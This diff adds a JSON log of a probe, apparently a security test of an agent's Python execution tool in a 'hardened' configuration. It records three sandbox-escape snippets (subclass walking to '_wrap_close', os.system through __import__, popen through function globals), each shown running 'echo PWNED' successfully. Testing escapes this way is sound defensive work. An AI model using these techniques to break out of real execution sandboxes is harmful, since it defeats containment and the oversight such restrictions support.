@@ -1,0 +1,37 @@
+{
+  "probe": "P12",
+  "config": "hardened",
+  "codes": [
+    "subs = ().__class__.__base__.__subclasses__()\nnames = [c.__name__ for c in subs]\nmsg = 'SUBS ' + str(len(subs)) + ' ' + str('_wrap_close' in names) + ' ' + str('Popen' in names)\nprint(msg)\nmsg",
+    "msg = \"SYSTEM \" + str(__import__(\"os\").system(\"echo PWNED\"))\nprint(msg)\nmsg",
+    "wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']\nmsg = 'WRAP ' + wc[0].__init__.__globals__['popen']('echo PWNED2').read()\nprint(msg)\nmsg"
+  ],
+  "runs": [
+    {
+      "ok": true,
+      "stdout": "SUBS 802 True True\nOut[1]: 'SUBS 802 True True'",
+      "ms": 518.8,
+      "started": 1795383322.191233
+    },
+    {
+      "ok": true,
+      "stdout": "PWNED\nSYSTEM 0\nOut[2]: 'SYSTEM 0'",
+      "ms": 9.8,
+      "started": 1795383322.710201
+    },
+    {
+      "ok": true,
+      "stdout": "WRAP PWNED2\nOut[3]: 'WRAP PWNED2\\n'",
+      "ms": 11.1,
+      "started": 1795383322.7201412
+    }
+  ],
+  "setup_ms": 0.2,
+  "done": true,
+  "killed": null,
+  "exit_code": 0,
+  "wall_s": 0.76,
+  "peak_tree_rss_gb": 0.114,
+  "calls": [],
+  "child_log_tail": "WARNING CodeMode runs arbitrary Python and shell with the permissions of this process. It is not a sandbox: provide human supervision or run the agent in an isolated container.\nPWNED\n"
+}
